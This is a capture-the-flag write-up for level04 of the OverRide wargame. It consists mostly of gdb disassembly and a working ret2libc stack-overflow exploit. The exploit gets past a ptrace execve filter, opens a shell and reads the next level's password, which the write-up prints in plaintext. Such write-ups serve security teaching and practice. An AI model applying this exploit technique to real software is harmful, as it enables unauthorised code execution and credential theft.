# OVERRIDE

## level04

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804845c  _init
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt
0x08048510  __gmon_start__
0x08048510  __gmon_start__@plt
0x08048520  kill
0x08048520  kill@plt
0x08048530  __libc_start_main
0x08048530  __libc_start_main@plt
0x08048540  prctl
0x08048540  prctl@plt
0x08048550  fork
0x08048550  fork@plt
0x08048560  __isoc99_scanf
0x08048560  __isoc99_scanf@plt
0x08048570  ptrace
0x08048570  ptrace@plt
0x08048580  _start
0x080485b0  __do_global_dtors_aux
0x08048610  frame_dummy
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
0x080486c8  main
0x08048830  __libc_csu_init
0x080488a0  __libc_csu_fini
0x080488a2  __i686.get_pc_thunk.bx
0x080488b0  __do_global_ctors_aux
0x080488dc  _fini
```

```sh
(gdb) disas clear_stdin
Dump of assembler code for function clear_stdin:
   0x08048634 <+0>:     push   %ebp
   0x08048635 <+1>:     mov    %esp,%ebp
   0x08048637 <+3>:     sub    $0x18,%esp
   0x0804863a <+6>:     movb   $0x0,-0x9(%ebp)            # char c = 0
   0x0804863e <+10>:    jmp    0x8048641 <clear_stdin+13>
   0x08048640 <+12>:    nop
   0x08048641 <+13>:    call   0x80484c0 <getchar@plt>
   0x08048646 <+18>:    mov    %al,-0x9(%ebp)
   0x08048649 <+21>:    cmpb   $0xa,-0x9(%ebp)            # '\n'
   0x0804864d <+25>:    je     0x8048655 <clear_stdin+33>
   0x0804864f <+27>:    cmpb   $0xff,-0x9(%ebp)            # EOF
   0x08048653 <+31>:    jne    0x8048640 <clear_stdin+12>
   0x08048655 <+33>:    leave
   0x08048656 <+34>:    ret
End of assembler dump.
```
```sh
(gdb) disas get_unum
Dump of assembler code for function get_unum:
   0x08048657 <+0>:     push   %ebp
   0x08048658 <+1>:     mov    %esp,%ebp
   0x0804865a <+3>:     sub    $0x28,%esp
   0x0804865d <+6>:     movl   $0x0,-0xc(%ebp)             # unsigned n = 0
   0x08048664 <+13>:    mov    0x804a040,%eax             # stdout
   0x08048669 <+18>:    mov    %eax,(%esp)
   0x0804866c <+21>:    call   0x80484a0 <fflush@plt>
   0x08048671 <+26>:    mov    $0x8048900,%eax             # "%u"
   0x08048676 <+31>:    lea    -0xc(%ebp),%edx
   0x08048679 <+34>:    mov    %edx,0x4(%esp)
   0x0804867d <+38>:    mov    %eax,(%esp)
   0x08048680 <+41>:    call   0x8048560 <__isoc99_scanf@plt>
   0x08048685 <+46>:    call   0x8048634 <clear_stdin>
   0x0804868a <+51>:    mov    -0xc(%ebp),%eax
   0x0804868d <+54>:    leave
   0x0804868e <+55>:    ret                               # unused by main
End of assembler dump.
```
```sh
(gdb) disas prog_timeout
Dump of assembler code for function prog_timeout:
   0x0804868f <+0>:     push   %ebp
   0x08048690 <+1>:     mov    %esp,%ebp
   0x08048692 <+3>:     mov    $0x1,%eax                  # sys_exit
   0x08048697 <+8>:     mov    $0x1,%ebx
   0x0804869c <+13>:    int    $0x80
   0x0804869e <+15>:    pop    %ebp
   0x0804869f <+16>:    ret
End of assembler dump.
```
```sh
(gdb) disas enable_timeout_cons
Dump of assembler code for function enable_timeout_cons:
   0x080486a0 <+0>:     push   %ebp
   0x080486a1 <+1>:     mov    %esp,%ebp
   0x080486a3 <+3>:     sub    $0x18,%esp
   0x080486a6 <+6>:     movl   $0x804868f,0x4(%esp)        # prog_timeout
   0x080486ae <+14>:    movl   $0xe,(%esp)                # SIGALRM
   0x080486b5 <+21>:    call   0x80484d0 <signal@plt>
   0x080486ba <+26>:    movl   $0x3c,(%esp)               # 60 seconds
   0x080486c1 <+33>:    call   0x80484e0 <alarm@plt>
   0x080486c6 <+38>:    leave
   0x080486c7 <+39>:    ret                               # not called from this main
End of assembler dump.
```
```sh
(gdb) disas main
(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp
                                                        # 0x20(%esp)  char buf[128]
                                                        # 0x1c(%esp)  int status
                                                        # 0xa8(%esp)  long syscall
                                                        # 0xac(%esp)  pid_t pid
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
   0x080486e6 <+30>:    mov    $0x0,%eax
   0x080486eb <+35>:    mov    $0x20,%edx                 # 32 dwords
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi)          # memset(buf, 0, 128)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:    jne    0x8048769 <main+161>       # pid != 0 → parent
   # --- child ---
   0x08048713 <+75>:    movl   $0x1,0x4(%esp)             # SIGHUP
   0x0804871b <+83>:    movl   $0x1,(%esp)                # PR_SET_PDEATHSIG
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)                # PTRACE_TRACEME
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:   movl   $0x8048903,(%esp)
   0x08048752 <+138>:   call   0x8048500 <puts@plt>       # "Give me some shellcode, k"
   0x08048757 <+143>:   lea    0x20(%esp),%eax            # buf[128]
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>       # unbounded overflow
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop                               # parent loop head
   # --- parent ---
   0x08048769 <+161>:   lea    0x1c(%esp),%eax
   0x0804876d <+165>:   mov    %eax,(%esp)
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>       # wait(&status)
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp)
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax
   0x0804878a <+194>:   test   %eax,%eax
   0x0804878c <+196>:   je     0x80487ac <main+228>       # WIFEXITED
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al                        # WIFSIGNALED
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242>       # stopped by ptrace → peek
   0x080487ac <+228>:   movl   $0x804891d,(%esp)
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>       # "child is exiting..."
   0x080487b8 <+240>:   jmp    0x804881a <main+338>
   0x080487ba <+242>:   movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)            # ORIG_EAX (i386)
   0x080487ca <+258>:   mov    0xac(%esp),%eax
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)                # PTRACE_PEEKUSER
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)            # 11 = execve
   0x080487f0 <+296>:   jne    0x8048768 <main+160>       # else wait again
   0x080487f6 <+302>:   movl   $0x8048931,(%esp)
   0x080487fd <+309>:   call   0x8048500 <puts@plt>       # "no exec() for you"
   0x08048802 <+314>:   movl   $0x9,0x4(%esp)             # SIGKILL
   0x0804880a <+322>:   mov    0xac(%esp),%eax
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret
End of assembler dump.
```

`fork` + `gets` overflow + parent that kills the child on `execve`. The shell is ret2libc `system("/bin/sh")`, not raw `execve` shellcode.

`buf` is 128 bytes at `esp+0x20`. `gets` writes until a newline -> stack overflow, we own the child's saved `EIP`

We cannot directly use an `execve` shellcode since `execve` is syscall 11 and the parents peeks `ORIG_EAX` after every stop. If it sees `11`, it prints `no exec() for you` and `kill(9)`

It work if we do `system("/bin/sh"` since the `fork` + `execve` will happen in a new process without ptrace attached

Let's retrieve the necessary addresses for system, exit and "/bin/sh"

```sh
(gdb) p system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$4 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 1903
Mapped address spaces:
        Start Addr   End Addr       Size     Offset objfile
        ...
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
       ...
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

We know need the EIP offset

```sh
(gdb) set follow-fork-mode child
(gdb) break *0x0804875e
Breakpoint 1 at 0x804875e
(gdb) run
Starting program: /home/users/level04/level04
[New process 1903]
Give me some shellcode, k
[Switching to process 1903]
Breakpoint 1, 0x0804875e in main ()
(gdb) p/x ($ebp+4) - ($esp+0x20)
$1 = 0x9c

level04@OverRide:~$ echo $((0x9c))
156
```
```
system      0xf7e6aed0  \xd0\xae\xe6\xf7
exit        0xf7e5eb70  \x70\xeb\xe5\xf7
"/bin/sh"   0xf7f897ec  \xec\x97\xf8\xf7
```

### Payload
We can now build the payload

```sh
level04@OverRide:~$ (python -c 'print "A"*156+"\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7"'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```